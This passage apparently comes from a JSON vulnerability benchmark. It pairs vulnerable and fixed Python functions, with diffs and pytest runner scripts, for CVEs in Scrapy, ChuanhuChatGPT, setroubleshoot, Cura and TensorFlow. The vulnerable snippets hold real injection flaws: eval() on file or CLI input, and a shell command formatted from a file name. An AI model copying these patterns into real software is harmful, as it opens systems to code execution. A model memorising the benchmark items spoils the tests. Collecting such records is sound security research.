    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_49_1",
        "commit": "aa0306a",
        "file_path": "scrapy/downloadermiddlewares/redirect.py",
        "start_line": 49,
        "end_line": 53,
        "snippet": "    def _redirect_request_using_get(self, request, redirect_url):\n        redirected = request.replace(url=redirect_url, method='GET', body='')\n        redirected.headers.pop('Content-Type', None)\n        redirected.headers.pop('Content-Length', None)\n        return redirected"
      },
      {
        "id": "vul_py_49_2",
        "commit": "aa0306a",
        "file_path": "scrapy/downloadermiddlewares/redirect.py",
        "start_line": 62,
        "end_line": 87,
        "snippet": "    def process_response(self, request, response, spider):\n        if (\n            request.meta.get('dont_redirect', False)\n            or response.status in getattr(spider, 'handle_httpstatus_list', [])\n            or response.status in request.meta.get('handle_httpstatus_list', [])\n            or request.meta.get('handle_httpstatus_all', False)\n        ):\n            return response\n\n        allowed_status = (301, 302, 303, 307, 308)\n        if 'Location' not in response.headers or response.status not in allowed_status:\n            return response\n\n        location = safe_url_string(response.headers['Location'])\n        if response.headers['Location'].startswith(b'//'):\n            request_scheme = urlparse(request.url).scheme\n            location = request_scheme + '://' + location.lstrip('/')\n\n        redirected_url = urljoin(request.url, location)\n\n        if response.status in (301, 307, 308) or request.method == 'HEAD':\n            redirected = request.replace(url=redirected_url)\n            return self._redirect(redirected, request, spider, response.status)\n\n        redirected = self._redirect_request_using_get(request, redirected_url)\n        return self._redirect(redirected, request, spider, response.status)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_49_1",
        "commit": "8ce01b3",
        "file_path": "scrapy/downloadermiddlewares/redirect.py",
        "start_line": 65,
        "end_line": 74,
        "snippet": "    def _redirect_request_using_get(self, request, redirect_url):\n        redirect_request = _build_redirect_request(\n            request,\n            url=redirect_url,\n            method='GET',\n            body='',\n        )\n        redirect_request.headers.pop('Content-Type', None)\n        redirect_request.headers.pop('Content-Length', None)\n        return redirect_request"
      },
      {
        "id": "fix_py_49_2",
        "commit": "8ce01b3",
        "file_path": "scrapy/downloadermiddlewares/redirect.py",
        "start_line": 83,
        "end_line": 108,
        "snippet": "    def process_response(self, request, response, spider):\n        if (\n            request.meta.get('dont_redirect', False)\n            or response.status in getattr(spider, 'handle_httpstatus_list', [])\n            or response.status in request.meta.get('handle_httpstatus_list', [])\n            or request.meta.get('handle_httpstatus_all', False)\n        ):\n            return response\n\n        allowed_status = (301, 302, 303, 307, 308)\n        if 'Location' not in response.headers or response.status not in allowed_status:\n            return response\n\n        location = safe_url_string(response.headers['Location'])\n        if response.headers['Location'].startswith(b'//'):\n            request_scheme = urlparse(request.url).scheme\n            location = request_scheme + '://' + location.lstrip('/')\n\n        redirected_url = urljoin(request.url, location)\n\n        if response.status in (301, 307, 308) or request.method == 'HEAD':\n            redirected = _build_redirect_request(request, url=redirected_url)\n            return self._redirect(redirected, request, spider, response.status)\n\n        redirected = self._redirect_request_using_get(request, redirected_url)\n        return self._redirect(redirected, request, spider, response.status)"
      },
      {
        "id": "fix_py_49_3",
        "commit": "8ce01b3",
        "file_path": "scrapy/downloadermiddlewares/redirect.py",
        "start_line": 15,
        "end_line": 27,
        "snippet": "def _build_redirect_request(source_request, *, url, method=None, body=None):\n    redirect_request = source_request.replace(\n        url=url,\n        method=method,\n        body=body,\n        cookies=None,\n    )\n    if 'Cookie' in redirect_request.headers:\n        source_request_netloc = urlparse_cached(source_request).netloc\n        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n        if source_request_netloc != redirect_request_netloc:\n            del redirect_request.headers['Cookie']\n    return redirect_request"
      }
    ],
    "vul_patch": "--- a/scrapy/downloadermiddlewares/redirect.py\n+++ b/scrapy/downloadermiddlewares/redirect.py\n@@ -1,5 +1,10 @@\n     def _redirect_request_using_get(self, request, redirect_url):\n-        redirected = request.replace(url=redirect_url, method='GET', body='')\n-        redirected.headers.pop('Content-Type', None)\n-        redirected.headers.pop('Content-Length', None)\n-        return redirected\n+        redirect_request = _build_redirect_request(\n+            request,\n+            url=redirect_url,\n+            method='GET',\n+            body='',\n+        )\n+        redirect_request.headers.pop('Content-Type', None)\n+        redirect_request.headers.pop('Content-Length', None)\n+        return redirect_request\n\n--- a/scrapy/downloadermiddlewares/redirect.py\n+++ b/scrapy/downloadermiddlewares/redirect.py\n@@ -19,7 +19,7 @@\n         redirected_url = urljoin(request.url, location)\n \n         if response.status in (301, 307, 308) or request.method == 'HEAD':\n-            redirected = request.replace(url=redirected_url)\n+            redirected = _build_redirect_request(request, url=redirected_url)\n             return self._redirect(redirected, request, spider, response.status)\n \n         redirected = self._redirect_request_using_get(request, redirected_url)\n\n--- /dev/null\n+++ b/scrapy/downloadermiddlewares/redirect.py\n@@ -0,0 +1,13 @@\n+def _build_redirect_request(source_request, *, url, method=None, body=None):\n+    redirect_request = source_request.replace(\n+        url=url,\n+        method=method,\n+        body=body,\n+        cookies=None,\n+    )\n+    if 'Cookie' in redirect_request.headers:\n+        source_request_netloc = urlparse_cached(source_request).netloc\n+        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n+        if source_request_netloc != redirect_request_netloc:\n+            del redirect_request.headers['Cookie']\n+    return redirect_request\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-0577:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/scrapy\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-0577/bin/python -m pytest tests/test_downloadermiddleware_cookies.py -k \"test_cookie_redirect_ or test_cookie_header_redirect_\" -p no:warning --disable-warnings\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-0577:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/scrapy\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-0577/bin/python -m pytest tests/test_downloadermiddleware_cookies.py -p no:warning --disable-warnings\n"
  },
  {
    "cve_id": "CVE-2024-5823",
    "cve_description": "A file overwrite vulnerability exists in gaizhenbiao/chuanhuchatgpt versions <= 20240410. This vulnerability allows an attacker to gain unauthorized access to overwrite critical configuration files within the system. Exploiting this vulnerability can lead to unauthorized changes in system behavior or security settings. Additionally, tampering with these configuration files can result in a denial of service (DoS) condition, disrupting normal system operation.",
    "cwe_info": {
      "CWE-610": {
        "name": "Externally Controlled Reference to a Resource in Another Sphere",
        "description": "The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere."
      }
    },
    "repo": "https://github.com/gaizhenbiao/chuanhuchatgpt",
    "patch_url": [
      "https://github.com/gaizhenbiao/chuanhuchatgpt/commit/720c23d755a4a955dcb0a54e8c200a2247a27f8b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_56_1",
        "commit": "ffea5e9",
        "file_path": "modules/utils.py",
        "start_line": 744,
        "end_line": 760,
        "snippet": "def update_chuanhu():\n    from .repo import background_update\n\n    print(\"[Updater] Trying to update...\")\n    update_status = background_update()\n    if update_status == \"success\":\n        logging.info(\"Successfully updated, restart needed\")\n        status = '<span id=\"update-status\" class=\"hideK\">success</span>'\n        return gr.Markdown(value=i18n(\"\\u66f4\\u65b0\\u6210\\u529f\\uff0c\\u8bf7\\u91cd\\u542f\\u672c\\u7a0b\\u5e8f\") + status)\n    else:\n        status = '<span id=\"update-status\" class=\"hideK\">failure</span>'\n        return gr.Markdown(\n            value=i18n(\n                \"\\u66f4\\u65b0\\u5931\\u8d25\\uff0c\\u8bf7\\u5c1d\\u8bd5[\\u624b\\u52a8\\u66f4\\u65b0](https://github.com/GaiZhenbiao/ChuanhuChatGPT/wiki/\\u4f7f\\u7528\\u6559\\u7a0b#\\u624b\\u52a8\\u66f4\\u65b0)\"\n            )\n            + status\n        )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_56_1",
        "commit": "720c23d755a4a955dcb0a54e8c200a2247a27f8b",
        "file_path": "ChuanhuChatbot.py",
        "start_line": 784,
        "end_line": 784,
        "snippet": "        [user_name],"
      },
      {
        "id": "fix_py_56_2",
        "commit": "720c23d755a4a955dcb0a54e8c200a2247a27f8b",
        "file_path": "modules/utils.py",
        "start_line": 744,
        "end_line": 762,
        "snippet": "def update_chuanhu(username):\n    if username not in admin_list:\n        return gr.Markdown(value=i18n(\"no_permission_to_update_description\"))\n    from .repo import background_update\n\n    print(\"[Updater] Trying to update...\")\n    update_status = background_update()\n    if update_status == \"success\":\n        logging.info(\"Successfully updated, restart needed\")\n        status = '<span id=\"update-status\" class=\"hideK\">success</span>'\n        return gr.Markdown(value=i18n(\"\\u66f4\\u65b0\\u6210\\u529f\\uff0c\\u8bf7\\u91cd\\u542f\\u672c\\u7a0b\\u5e8f\") + status)\n    else:\n        status = '<span id=\"update-status\" class=\"hideK\">failure</span>'\n        return gr.Markdown(\n            value=i18n(\n                \"\\u66f4\\u65b0\\u5931\\u8d25\\uff0c\\u8bf7\\u5c1d\\u8bd5[\\u624b\\u52a8\\u66f4\\u65b0](https://github.com/GaiZhenbiao/ChuanhuChatGPT/wiki/\\u4f7f\\u7528\\u6559\\u7a0b#\\u624b\\u52a8\\u66f4\\u65b0)\"\n            )\n            + status\n        )"
      },
      {
        "id": "fix_py_56_3",
        "commit": "720c23d755a4a955dcb0a54e8c200a2247a27f8b",
        "file_path": "modules/utils.py",
        "start_line": 30,
        "end_line": 30,
        "snippet": "from modules.config import retrieve_proxy, hide_history_when_not_logged_in, admin_list"
      }
    ],
    "vul_patch": "--- a/modules/utils.py\n+++ b/ChuanhuChatbot.py\n@@ -1,17 +1 @@\n-def update_chuanhu():\n-    from .repo import background_update\n-\n-    print(\"[Updater] Trying to update...\")\n-    update_status = background_update()\n-    if update_status == \"success\":\n-        logging.info(\"Successfully updated, restart needed\")\n-        status = '<span id=\"update-status\" class=\"hideK\">success</span>'\n-        return gr.Markdown(value=i18n(\"\\u66f4\\u65b0\\u6210\\u529f\\uff0c\\u8bf7\\u91cd\\u542f\\u672c\\u7a0b\\u5e8f\") + status)\n-    else:\n-        status = '<span id=\"update-status\" class=\"hideK\">failure</span>'\n-        return gr.Markdown(\n-            value=i18n(\n-                \"\\u66f4\\u65b0\\u5931\\u8d25\\uff0c\\u8bf7\\u5c1d\\u8bd5[\\u624b\\u52a8\\u66f4\\u65b0](https://github.com/GaiZhenbiao/ChuanhuChatGPT/wiki/\\u4f7f\\u7528\\u6559\\u7a0b#\\u624b\\u52a8\\u66f4\\u65b0)\"\n-            )\n-            + status\n-        )\n+        [user_name],\n\n--- /dev/null\n+++ b/ChuanhuChatbot.py\n@@ -0,0 +1,19 @@\n+def update_chuanhu(username):\n+    if username not in admin_list:\n+        return gr.Markdown(value=i18n(\"no_permission_to_update_description\"))\n+    from .repo import background_update\n+\n+    print(\"[Updater] Trying to update...\")\n+    update_status = background_update()\n+    if update_status == \"success\":\n+        logging.info(\"Successfully updated, restart needed\")\n+        status = '<span id=\"update-status\" class=\"hideK\">success</span>'\n+        return gr.Markdown(value=i18n(\"\\u66f4\\u65b0\\u6210\\u529f\\uff0c\\u8bf7\\u91cd\\u542f\\u672c\\u7a0b\\u5e8f\") + status)\n+    else:\n+        status = '<span id=\"update-status\" class=\"hideK\">failure</span>'\n+        return gr.Markdown(\n+            value=i18n(\n+                \"\\u66f4\\u65b0\\u5931\\u8d25\\uff0c\\u8bf7\\u5c1d\\u8bd5[\\u624b\\u52a8\\u66f4\\u65b0](https://github.com/GaiZhenbiao/ChuanhuChatGPT/wiki/\\u4f7f\\u7528\\u6559\\u7a0b#\\u624b\\u52a8\\u66f4\\u65b0)\"\n+            )\n+            + status\n+        )\n\n--- /dev/null\n+++ b/ChuanhuChatbot.py\n@@ -0,0 +1 @@\n+from modules.config import retrieve_proxy, hide_history_when_not_logged_in, admin_list\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2024-5823:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/chuanhuchatgpt\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2024-5823/bin/python  hand_test.py\n",
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2016-4444",
    "cve_description": "The allow_execmod plugin for setroubleshoot before 3.2.23 allows local users to execute arbitrary commands by triggering an execmod SELinux denial with a crafted binary filename, related to the commands.getstatusoutput function.",
    "cwe_info": {
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/fedora-selinux/setroubleshoot",
    "patch_url": [
      "https://github.com/fedora-selinux/setroubleshoot/commit/5cd60033ea7f5bdf8c19c27b23ea2d773d9b09f5"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_196_1",
        "commit": "2d12677",
        "file_path": "plugins/src/allow_execmod.py",
        "start_line": 93,
        "end_line": 103,
        "snippet": "    def analyze(self, avc):\n        import commands\n        if avc.has_any_access_in(['execmod']):\n            # MATCH\n            if (commands.getstatusoutput(\"eu-readelf -d %s | fgrep -q TEXTREL\" % avc.tpath)[0] == 1):\n                return self.report((\"unsafe\"))\n\n            mcon = selinux.matchpathcon(avc.tpath.strip('\"'), S_IFREG)[1]\n            if mcon.split(\":\")[2] == \"lib_t\":\n                return self.report()\n        return None"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_196_1",
        "commit": "5cd6003",
        "file_path": "plugins/src/allow_execmod.py",
        "start_line": 93,
        "end_line": 109,
        "snippet": "    def analyze(self, avc):\n        import subprocess\n        if avc.has_any_access_in(['execmod']):\n            # MATCH\n            # from https://docs.python.org/2.7/library/subprocess.html#replacing-shell-pipeline\n            p1 = subprocess.Popen(['eu-readelf', '-d', avc.tpath], stdout=subprocess.PIPE)\n            p2 = subprocess.Popen([\"fgrep\", \"-q\", \"TEXTREL\"], stdin=p1.stdout, stdout=subprocess.PIPE)\n            p1.stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n            p1.wait()\n            p2.wait()\n            if p2.returncode == 1:\n                return self.report((\"unsafe\"))\n\n            mcon = selinux.matchpathcon(avc.tpath.strip('\"'), S_IFREG)[1]\n            if mcon.split(\":\")[2] == \"lib_t\":\n                return self.report()\n        return None"
      }
    ],
    "vul_patch": "--- a/plugins/src/allow_execmod.py\n+++ b/plugins/src/allow_execmod.py\n@@ -1,8 +1,14 @@\n     def analyze(self, avc):\n-        import commands\n+        import subprocess\n         if avc.has_any_access_in(['execmod']):\n             # MATCH\n-            if (commands.getstatusoutput(\"eu-readelf -d %s | fgrep -q TEXTREL\" % avc.tpath)[0] == 1):\n+            # from https://docs.python.org/2.7/library/subprocess.html#replacing-shell-pipeline\n+            p1 = subprocess.Popen(['eu-readelf', '-d', avc.tpath], stdout=subprocess.PIPE)\n+            p2 = subprocess.Popen([\"fgrep\", \"-q\", \"TEXTREL\"], stdin=p1.stdout, stdout=subprocess.PIPE)\n+            p1.stdout.close()  # Allow p1 to receive a SIGPIPE if p2 exits.\n+            p1.wait()\n+            p2.wait()\n+            if p2.returncode == 1:\n                 return self.report((\"unsafe\"))\n \n             mcon = selinux.matchpathcon(avc.tpath.strip('\"'), S_IFREG)[1]\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-8374",
    "cve_description": "UltiMaker Cura slicer versions 5.7.0-beta.1 through 5.7.2 are vulnerable to code injection via the 3MF format reader (/plugins/ThreeMFReader.py). The vulnerability arises from improper handling of the drop_to_buildplate property within 3MF files, which are ZIP archives containing the model data. When a 3MF file is loaded in Cura, the value of the drop_to_buildplate property is passed to the Python eval() function without proper sanitization, allowing an attacker to execute arbitrary code by crafting a malicious 3MF file. This vulnerability poses a significant risk as 3MF files are commonly shared via 3D model databases.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      }
    },
    "repo": "https://github.com/Ultimaker/Cura",
    "patch_url": [
      "https://github.com/Ultimaker/Cura/commit/285a241eb28da3188c977f85d68937c0dad79c50"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_130_1",
        "commit": "2d85e9f",
        "file_path": "plugins/3MFReader/ThreeMFReader.py",
        "start_line": 96,
        "end_line": 216,
        "snippet": "    def _convertSavitarNodeToUMNode(savitar_node: Savitar.SceneNode, file_name: str = \"\") -> Optional[SceneNode]:\n        \"\"\"Convenience function that converts a SceneNode object (as obtained from libSavitar) to a scene node.\n\n        :returns: Scene node.\n        \"\"\"\n        try:\n            node_name = savitar_node.getName()\n            node_id = savitar_node.getId()\n        except AttributeError:\n            Logger.log(\"e\", \"Outdated version of libSavitar detected! Please update to the newest version!\")\n            node_name = \"\"\n            node_id = \"\"\n\n        if node_name == \"\":\n            if file_name != \"\":\n                node_name = os.path.basename(file_name)\n            else:\n                node_name = \"Object {}\".format(node_id)\n\n        active_build_plate = CuraApplication.getInstance().getMultiBuildPlateModel().activeBuildPlate\n\n        um_node = CuraSceneNode() # This adds a SettingOverrideDecorator\n        um_node.addDecorator(BuildPlateDecorator(active_build_plate))\n        try:\n            um_node.addDecorator(ConvexHullDecorator())\n        except:\n            pass\n        um_node.setName(node_name)\n        um_node.setId(node_id)\n        transformation = ThreeMFReader._createMatrixFromTransformationString(savitar_node.getTransformation())\n        um_node.setTransformation(transformation)\n        mesh_builder = MeshBuilder()\n\n        data = numpy.fromstring(savitar_node.getMeshData().getFlatVerticesAsBytes(), dtype=numpy.float32)\n\n        vertices = numpy.resize(data, (int(data.size / 3), 3))\n        mesh_builder.setVertices(vertices)\n        mesh_builder.calculateNormals(fast=True)\n        if file_name:\n            # The filename is used to give the user the option to reload the file if it is changed on disk\n            # It is only set for the root node of the 3mf file\n            mesh_builder.setFileName(file_name)\n        mesh_data = mesh_builder.build()\n\n        if len(mesh_data.getVertices()):\n            um_node.setMeshData(mesh_data)\n\n        for child in savitar_node.getChildren():\n            child_node = ThreeMFReader._convertSavitarNodeToUMNode(child)\n            if child_node:\n                um_node.addChild(child_node)\n\n        if um_node.getMeshData() is None and len(um_node.getChildren()) == 0:\n            return None\n\n        settings = savitar_node.getSettings()\n\n        # Add the setting override decorator, so we can add settings to this node.\n        if settings:\n            global_container_stack = CuraApplication.getInstance().getGlobalContainerStack()\n\n            # Ensure the correct next container for the SettingOverride decorator is set.\n            if global_container_stack:\n                default_stack = ExtruderManager.getInstance().getExtruderStack(0)\n\n                if default_stack:\n                    um_node.callDecoration(\"setActiveExtruder\", default_stack.getId())\n\n                # Get the definition & set it\n                definition_id = ContainerTree.getInstance().machines[global_container_stack.definition.getId()].quality_definition\n                um_node.callDecoration(\"getStack\").getTop().setDefinition(definition_id)\n\n            setting_container = um_node.callDecoration(\"getStack\").getTop()\n            known_setting_keys = um_node.callDecoration(\"getStack\").getAllKeys()\n            for key in settings:\n                setting_value = settings[key].value\n\n                # Extruder_nr is a special case.\n                if key == \"extruder_nr\":\n                    extruder_stack = ExtruderManager.getInstance().getExtruderStack(int(setting_value))\n                    if extruder_stack:\n                        um_node.callDecoration(\"setActiveExtruder\", extruder_stack.getId())\n                    else:\n                        Logger.log(\"w\", \"Unable to find extruder in position %s\", setting_value)\n                    continue\n                if key == \"print_order\":\n                    um_node.printOrder = int(setting_value)\n                    continue\n                if key ==\"drop_to_buildplate\":\n                    um_node.setSetting(SceneNodeSettings.AutoDropDown, eval(setting_value))\n                    continue\n                if key in known_setting_keys:\n                    setting_container.setProperty(key, \"value\", setting_value)\n                else:\n                    um_node.metadata[key] = settings[key]\n\n        if len(um_node.getChildren()) > 0 and um_node.getMeshData() is None:\n            if len(um_node.getAllChildren()) == 1:\n                # We don't want groups of one, so move the node up one \"level\"\n                child_node = um_node.getChildren()[0]\n                # Move all the meshes of children so that toolhandles are shown in the correct place.\n                if child_node.getMeshData():\n                    extents = child_node.getMeshData().getExtents()\n                    move_matrix = Matrix()\n                    move_matrix.translate(-extents.center)\n                    child_node.setMeshData(child_node.getMeshData().getTransformed(move_matrix))\n                    child_node.translate(extents.center)\n                parent_transformation = um_node.getLocalTransformation()\n                child_transformation = child_node.getLocalTransformation()\n                child_node.setTransformation(parent_transformation.multiply(child_transformation))\n                um_node = cast(CuraSceneNode, um_node.getChildren()[0])\n            else:\n                group_decorator = GroupDecorator()\n                um_node.addDecorator(group_decorator)\n        um_node.setSelectable(True)\n        if um_node.getMeshData():\n            # Assuming that all nodes with mesh data are printable objects\n            # affects (auto) slicing\n            sliceable_decorator = SliceableObjectDecorator()\n            um_node.addDecorator(sliceable_decorator)\n        return um_node"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_130_1",
        "commit": "285a241",
        "file_path": "plugins/3MFReader/ThreeMFReader.py",
        "start_line": 97,
        "end_line": 217,
        "snippet": "    def _convertSavitarNodeToUMNode(savitar_node: Savitar.SceneNode, file_name: str = \"\") -> Optional[SceneNode]:\n        \"\"\"Convenience function that converts a SceneNode object (as obtained from libSavitar) to a scene node.\n\n        :returns: Scene node.\n        \"\"\"\n        try:\n            node_name = savitar_node.getName()\n            node_id = savitar_node.getId()\n        except AttributeError:\n            Logger.log(\"e\", \"Outdated version of libSavitar detected! Please update to the newest version!\")\n            node_name = \"\"\n            node_id = \"\"\n\n        if node_name == \"\":\n            if file_name != \"\":\n                node_name = os.path.basename(file_name)\n            else:\n                node_name = \"Object {}\".format(node_id)\n\n        active_build_plate = CuraApplication.getInstance().getMultiBuildPlateModel().activeBuildPlate\n\n        um_node = CuraSceneNode() # This adds a SettingOverrideDecorator\n        um_node.addDecorator(BuildPlateDecorator(active_build_plate))\n        try:\n            um_node.addDecorator(ConvexHullDecorator())\n        except:\n            pass\n        um_node.setName(node_name)\n        um_node.setId(node_id)\n        transformation = ThreeMFReader._createMatrixFromTransformationString(savitar_node.getTransformation())\n        um_node.setTransformation(transformation)\n        mesh_builder = MeshBuilder()\n\n        data = numpy.fromstring(savitar_node.getMeshData().getFlatVerticesAsBytes(), dtype=numpy.float32)\n\n        vertices = numpy.resize(data, (int(data.size / 3), 3))\n        mesh_builder.setVertices(vertices)\n        mesh_builder.calculateNormals(fast=True)\n        if file_name:\n            # The filename is used to give the user the option to reload the file if it is changed on disk\n            # It is only set for the root node of the 3mf file\n            mesh_builder.setFileName(file_name)\n        mesh_data = mesh_builder.build()\n\n        if len(mesh_data.getVertices()):\n            um_node.setMeshData(mesh_data)\n\n        for child in savitar_node.getChildren():\n            child_node = ThreeMFReader._convertSavitarNodeToUMNode(child)\n            if child_node:\n                um_node.addChild(child_node)\n\n        if um_node.getMeshData() is None and len(um_node.getChildren()) == 0:\n            return None\n\n        settings = savitar_node.getSettings()\n\n        # Add the setting override decorator, so we can add settings to this node.\n        if settings:\n            global_container_stack = CuraApplication.getInstance().getGlobalContainerStack()\n\n            # Ensure the correct next container for the SettingOverride decorator is set.\n            if global_container_stack:\n                default_stack = ExtruderManager.getInstance().getExtruderStack(0)\n\n                if default_stack:\n                    um_node.callDecoration(\"setActiveExtruder\", default_stack.getId())\n\n                # Get the definition & set it\n                definition_id = ContainerTree.getInstance().machines[global_container_stack.definition.getId()].quality_definition\n                um_node.callDecoration(\"getStack\").getTop().setDefinition(definition_id)\n\n            setting_container = um_node.callDecoration(\"getStack\").getTop()\n            known_setting_keys = um_node.callDecoration(\"getStack\").getAllKeys()\n            for key in settings:\n                setting_value = settings[key].value\n\n                # Extruder_nr is a special case.\n                if key == \"extruder_nr\":\n                    extruder_stack = ExtruderManager.getInstance().getExtruderStack(int(setting_value))\n                    if extruder_stack:\n                        um_node.callDecoration(\"setActiveExtruder\", extruder_stack.getId())\n                    else:\n                        Logger.log(\"w\", \"Unable to find extruder in position %s\", setting_value)\n                    continue\n                if key == \"print_order\":\n                    um_node.printOrder = int(setting_value)\n                    continue\n                if key ==\"drop_to_buildplate\":\n                    um_node.setSetting(SceneNodeSettings.AutoDropDown, parseBool(setting_value))\n                    continue\n                if key in known_setting_keys:\n                    setting_container.setProperty(key, \"value\", setting_value)\n                else:\n                    um_node.metadata[key] = settings[key]\n\n        if len(um_node.getChildren()) > 0 and um_node.getMeshData() is None:\n            if len(um_node.getAllChildren()) == 1:\n                # We don't want groups of one, so move the node up one \"level\"\n                child_node = um_node.getChildren()[0]\n                # Move all the meshes of children so that toolhandles are shown in the correct place.\n                if child_node.getMeshData():\n                    extents = child_node.getMeshData().getExtents()\n                    move_matrix = Matrix()\n                    move_matrix.translate(-extents.center)\n                    child_node.setMeshData(child_node.getMeshData().getTransformed(move_matrix))\n                    child_node.translate(extents.center)\n                parent_transformation = um_node.getLocalTransformation()\n                child_transformation = child_node.getLocalTransformation()\n                child_node.setTransformation(parent_transformation.multiply(child_transformation))\n                um_node = cast(CuraSceneNode, um_node.getChildren()[0])\n            else:\n                group_decorator = GroupDecorator()\n                um_node.addDecorator(group_decorator)\n        um_node.setSelectable(True)\n        if um_node.getMeshData():\n            # Assuming that all nodes with mesh data are printable objects\n            # affects (auto) slicing\n            sliceable_decorator = SliceableObjectDecorator()\n            um_node.addDecorator(sliceable_decorator)\n        return um_node"
      }
    ],
    "vul_patch": "--- a/plugins/3MFReader/ThreeMFReader.py\n+++ b/plugins/3MFReader/ThreeMFReader.py\n@@ -87,7 +87,7 @@\n                     um_node.printOrder = int(setting_value)\n                     continue\n                 if key ==\"drop_to_buildplate\":\n-                    um_node.setSetting(SceneNodeSettings.AutoDropDown, eval(setting_value))\n+                    um_node.setSetting(SceneNodeSettings.AutoDropDown, parseBool(setting_value))\n                     continue\n                 if key in known_setting_keys:\n                     setting_container.setProperty(key, \"value\", setting_value)\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2021-41228",
    "cve_description": "TensorFlow is an open source platform for machine learning. In affected versions TensorFlow's `saved_model_cli` tool is vulnerable to a code injection as it calls `eval` on user supplied strings. This can be used by attackers to run arbitrary code on the plaform where the CLI tool runs. However, given that the tool is always run manually, the impact of this is not severe. We have patched this by adding a `safe` flag which defaults to `True` and an explicit warning for users. The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/tensorflow/tensorflow",
    "patch_url": [
      "https://github.com/tensorflow/tensorflow/commit/8b202f08d52e8206af2bdb2112a62fafbc546ec7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_174_1",
        "commit": "349172c",
        "file_path": "tensorflow/python/tools/saved_model_cli.py",
        "start_line": 524,
        "end_line": 550,
        "snippet": "def preprocess_input_exprs_arg_string(input_exprs_str):\n  \"\"\"Parses input arg into dictionary that maps input key to python expression.\n\n  Parses input string in the format of 'input_key=<python expression>' into a\n  dictionary that maps each input_key to its python expression.\n\n  Args:\n    input_exprs_str: A string that specifies python expression for input keys.\n    Each input is separated by semicolon. For each input key:\n        'input_key=<python expression>'\n\n  Returns:\n    A dictionary that maps input keys to their values.\n\n  Raises:\n    RuntimeError: An error when the given input string is in a bad format.\n  \"\"\"\n  input_dict = {}\n\n  for input_raw in filter(bool, input_exprs_str.split(';')):\n    if '=' not in input_exprs_str:\n      raise RuntimeError('--input_exprs \"%s\" format is incorrect. Please follow'\n                         '\"<input_key>=<python expression>\"' % input_exprs_str)\n    input_key, expr = input_raw.split('=', 1)\n    # ast.literal_eval does not work with numpy expressions\n    input_dict[input_key] = eval(expr)  # pylint: disable=eval-used\n  return input_dict"
      },
      {
        "id": "vul_py_174_2",
        "commit": "349172c",
        "file_path": "tensorflow/python/tools/saved_model_cli.py",
        "start_line": 611,
        "end_line": 711,
        "snippet": "def load_inputs_from_input_arg_string(inputs_str, input_exprs_str,\n                                      input_examples_str):\n  \"\"\"Parses input arg strings and create inputs feed_dict.\n\n  Parses '--inputs' string for inputs to be loaded from file, and parses\n  '--input_exprs' string for inputs to be evaluated from python expression.\n  '--input_examples' string for inputs to be created from tf.example feature\n  dictionary list.\n\n  Args:\n    inputs_str: A string that specified where to load inputs. Each input is\n        separated by semicolon.\n        * For each input key:\n            '<input_key>=<filename>' or\n            '<input_key>=<filename>[<variable_name>]'\n        * The optional 'variable_name' key will be set to None if not specified.\n        * File specified by 'filename' will be loaded using numpy.load. Inputs\n            can be loaded from only .npy, .npz or pickle files.\n        * The \"[variable_name]\" key is optional depending on the input file type\n            as descripted in more details below.\n        When loading from a npy file, which always contains a numpy ndarray, the\n        content will be directly assigned to the specified input tensor. If a\n        variable_name is specified, it will be ignored and a warning will be\n        issued.\n        When loading from a npz zip file, user can specify which variable within\n        the zip file to load for the input tensor inside the square brackets. If\n        nothing is specified, this function will check that only one file is\n        included in the zip and load it for the specified input 